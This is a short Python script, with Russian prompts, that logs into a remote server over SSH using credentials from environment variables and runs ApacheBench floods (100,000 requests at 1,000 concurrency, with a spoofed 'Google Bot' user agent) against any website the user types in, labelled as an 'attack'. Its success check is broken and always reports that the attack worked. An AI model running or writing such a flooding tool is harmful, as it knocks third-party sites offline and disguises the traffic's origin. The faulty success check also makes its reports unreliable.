import paramiko
from dotenv import *
import os


client = paramiko.SSHClient()
load_dotenv(find_dotenv())


def connect():
    global client 
    host = os.getenv('RM_HOST')
    port = os.getenv('RM_PORT')
    username =  os.getenv('RM_USER')
    password = os.getenv('RM_PASSWORD')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, username=username, password=password, port=port)


def main():
    global client
    site = input('Введите сайт для атаки: ')
    connect()
    for i in range(2):
        stdin, stdout, stderr = client.exec_command(f'ab -n 100000 -c 1000 -k -t 100 -r -H "User-Agent: Google Bot" {site}')
        output = stdout.read().decode()
        if "Finished 50000 requests":
            print(f'Атака успешно выполнилась')
        else:
            print(f'Атака не удалась, попробуйте еще раз')

if __name__== '__main__':
    main()
